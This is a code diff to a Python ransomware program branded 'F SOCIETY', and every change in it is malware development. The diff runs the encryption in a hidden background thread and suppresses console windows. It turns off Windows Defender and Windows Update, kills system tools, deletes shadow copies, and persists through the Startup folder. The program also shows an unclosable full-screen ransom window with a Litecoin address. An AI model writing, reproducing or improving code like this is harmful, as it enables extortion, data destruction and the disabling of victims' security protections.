@@ -12,6 +12,7 @@ from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
 from Crypto.Random import get_random_bytes
 import winreg
+import threading
 
 # --- Configuration ---
 LTC_ADDRESS = "LdyX3fNpWfUHowcHszy4uMNeL7ho6YUFXz"
@@ -114,18 +115,18 @@ def get_target_directories():
     ]
     return [p for p in paths if os.path.exists(p)]
 
-# --- System Manipulation ---
+# --- System Manipulation (Background) ---
 def disable_security():
     try:
-        subprocess.run('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"', shell=True, capture_output=True)
-        subprocess.run('powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"', shell=True, capture_output=True)
-        subprocess.run('powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true"', shell=True, capture_output=True)
-        subprocess.run('powershell -Command "Set-MpPreference -DisableIOAVProtection $true"', shell=True, capture_output=True)
-        subprocess.run('powershell -Command "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"', shell=True, capture_output=True)
-        subprocess.run('powershell -Command "Set-MpPreference -DisableArchiveScanning $true"', shell=True, capture_output=True)
-        subprocess.run('powershell -Command "Set-MpPreference -DisableIntrusionPreventionSystem $true"', shell=True, capture_output=True)
-        subprocess.run('powershell -Command "Set-MpPreference -DisableScriptScanning $true"', shell=True, capture_output=True)
-        subprocess.run('powershell -Command "Set-MpPreference -SubmitSamplesConsent 2"', shell=True, capture_output=True)
+        subprocess.run('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.run('powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.run('powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true"', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.run('powershell -Command "Set-MpPreference -DisableIOAVProtection $true"', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.run('powershell -Command "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.run('powershell -Command "Set-MpPreference -DisableArchiveScanning $true"', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.run('powershell -Command "Set-MpPreference -DisableIntrusionPreventionSystem $true"', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.run('powershell -Command "Set-MpPreference -DisableScriptScanning $true"', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.run('powershell -Command "Set-MpPreference -SubmitSamplesConsent 2"', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
         try:
             key = winreg.HKEY_LOCAL_MACHINE
             subkey = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
@@ -134,19 +135,19 @@ def disable_security():
             winreg.CloseKey(handle)
         except:
             pass
-        subprocess.run('net stop wuauserv', shell=True, capture_output=True)
-        subprocess.run('sc config wuauserv start= disabled', shell=True, capture_output=True)
-        subprocess.run('taskkill /f /im Taskmgr.exe 2>nul', shell=True)
-        subprocess.run('taskkill /f /im regedit.exe 2>nul', shell=True)
-        subprocess.run('taskkill /f /im cmd.exe 2>nul', shell=True)
-        subprocess.run('taskkill /f /im powershell.exe 2>nul', shell=True)
+        subprocess.run('net stop wuauserv', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.run('sc config wuauserv start= disabled', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.run('taskkill /f /im Taskmgr.exe 2>nul', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.run('taskkill /f /im regedit.exe 2>nul', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.run('taskkill /f /im cmd.exe 2>nul', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.run('taskkill /f /im powershell.exe 2>nul', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
     except:
         pass
 
 def delete_shadow_copies():
     try:
-        subprocess.run('vssadmin delete shadows /all /quiet', shell=True, capture_output=True)
-        subprocess.run('wmic shadowcopy delete', shell=True, capture_output=True)
+        subprocess.run('vssadmin delete shadows /all /quiet', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.run('wmic shadowcopy delete', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
     except:
         pass
 
@@ -167,7 +168,7 @@ def change_wallpaper():
         draw.text((100, 300), text, fill=(255, 0, 0), font=font)
         draw.text((100, 550), f"Pay {RANSOM_AMOUNT} in Litecoin", fill=(255, 255, 255), font=font2)
         draw.text((100, 650), LTC_ADDRESS, fill=(0, 255, 0), font=font3)
-        draw.text((100, 750), "To decrypt, run the program and enter the key.", fill=(255, 255, 0), font=font3)
+        draw.text((100, 750), "Run the program and enter the decryption key.", fill=(255, 255, 0), font=font3)
         wallpaper_path = os.environ['TEMP'] + '\\fsociety_wallpaper.bmp'
         img.save(wallpaper_path)
         ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, wallpaper_path, 3)
@@ -212,24 +213,62 @@ Run this program and enter the decryption key.
     with open(desktop + '\\README_FSOCIETY.txt', 'w') as f:
         f.write(note)
 
+def run_encryption():
+    """Run encryption in background thread"""
+    try:
+        key = generate_key()
+        iv = generate_iv()
+        key_hex = base64.b64encode(key).decode()
+        iv_hex = base64.b64encode(iv).decode()
+        
+        disable_security()
+        delete_shadow_copies()
+        change_wallpaper()
+        
+        total = 0
+        for directory in get_target_directories():
+            try:
+                count = encrypt_directory(directory, key, iv)
+                total += count
+            except:
+                pass
+        
+        create_ransom_note(key_hex, iv_hex)
+        
+        # Add to startup
+        try:
+            startup = os.environ.get('APPDATA', '') + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
+            shutil.copy2(sys.argv[0], startup + '\\fsociety_ransomware.exe')
+        except:
+            pass
+        
+    except:
+        pass
+
 # --- Full-Screen Decryption UI ---
 class RansomwareUI:
     def __init__(self, root):
         self.root = root
         self.root.title("F SOCIETY RANSOMWARE")
-        self.root.attributes('-fullscreen', True)  # Full screen
-        self.root.attributes('-topmost', True)     # Always on top
+        self.root.attributes('-fullscreen', True)
+        self.root.attributes('-topmost', True)
         self.root.configure(bg='black')
         
-        # Prevent closing with Alt+F4
+        # Prevent closing
         self.root.protocol("WM_DELETE_WINDOW", lambda: None)
-        
-        # Disable full-screen exit (F11)
         self.root.bind("<F11>", lambda e: "break")
         self.root.bind("<Escape>", lambda e: "break")
+        self.root.bind("<Alt-F4>", lambda e: "break")
         
-        # UI Elements
         self.create_widgets()
+        
+        # Run encryption in background after UI shows
+        self.root.after(100, self.start_encryption)
+    
+    def start_encryption(self):
+        self.update_status("[+] Encrypting files in background...")
+        threading.Thread(target=run_encryption, daemon=True).start()
+        self.root.after(5000, lambda: self.update_status("[+] Encryption running in background."))
     
     def create_widgets(self):
         # Title
@@ -246,7 +285,7 @@ class RansomwareUI:
         info = f"""
         Your files are encrypted with AES-256-CBC.
         
-        To decrypt your files, you must enter the decryption key.
+        To decrypt your files, enter the decryption key below.
         
         Litecoin Address: {LTC_ADDRESS}
         Amount: {RANSOM_AMOUNT}
@@ -268,6 +307,7 @@ class RansomwareUI:
                                   show='*', bg='white', fg='black')
         self.key_entry.pack(side=tk.LEFT, padx=10)
         self.key_entry.focus()
+        self.key_entry.bind('<Return>', lambda e: self.decrypt_action())
         
         # Buttons
         button_frame = tk.Frame(self.root, bg='black')
@@ -282,7 +322,7 @@ class RansomwareUI:
         self.status_text = scrolledtext.ScrolledText(self.root, height=10, 
                                                      font=('Arial', 12), bg='black', fg='#00ff00')
         self.status_text.pack(pady=20, padx=50, fill=tk.BOTH, expand=True)
-        self.status_text.insert(tk.END, "[+] Ready for decryption.\n")
+        self.status_text.insert(tk.END, "[+] System ready. Waiting for decryption key...\n")
         self.status_text.see(tk.END)
         self.status_text.config(state='disabled')
     
@@ -291,6 +331,7 @@ class RansomwareUI:
         self.status_text.insert(tk.END, message + "\n")
         self.status_text.see(tk.END)
         self.status_text.config(state='disabled')
+        self.root.update()
     
     def decrypt_action(self):
         key_input = self.key_entry.get().strip()
@@ -348,7 +389,6 @@ class RansomwareUI:
             except:
                 pass
             
-            # Show success message
             messagebox.showinfo("Success", f"Decryption complete!\n{count} files restored.")
             self.update_status("[+] You can now close this window.")
             
@@ -356,46 +396,12 @@ class RansomwareUI:
             self.update_status(f"[-] Decryption error: {str(e)}")
             messagebox.showerror("Error", f"Decryption failed: {str(e)}")
 
-def run_ui():
+# --- Main Entry Point ---
+def main():
+    # Always run UI
     root = tk.Tk()
     app = RansomwareUI(root)
     root.mainloop()
-
-# --- Main Entry Point ---
-def main():
-    # Check if running in encryption mode (no args or --encrypt)
-    if len(sys.argv) == 1 or (len(sys.argv) >= 2 and sys.argv[1] == '--encrypt'):
-        # Perform encryption
-        try:
-            key = generate_key()
-            iv = generate_iv()
-            key_hex = base64.b64encode(key).decode()
-            iv_hex = base64.b64encode(iv).decode()
-            
-            disable_security()
-            delete_shadow_copies()
-            change_wallpaper()
-            
-            total = 0
-            for directory in get_target_directories():
-                try:
-                    count = encrypt_directory(directory, key, iv)
-                    total += count
-                except:
-                    pass
-            
-            create_ransom_note(key_hex, iv_hex)
-            
-            # Launch UI for decryption
-            run_ui()
-            
-        except Exception as e:
-            print(f"[-] Encryption error: {e}")
-            time.sleep(5)
-    
-    else:
-        # If any arguments, just run UI (for decryption)
-        run_ui()
 
 if __name__ == "__main__":
     main()
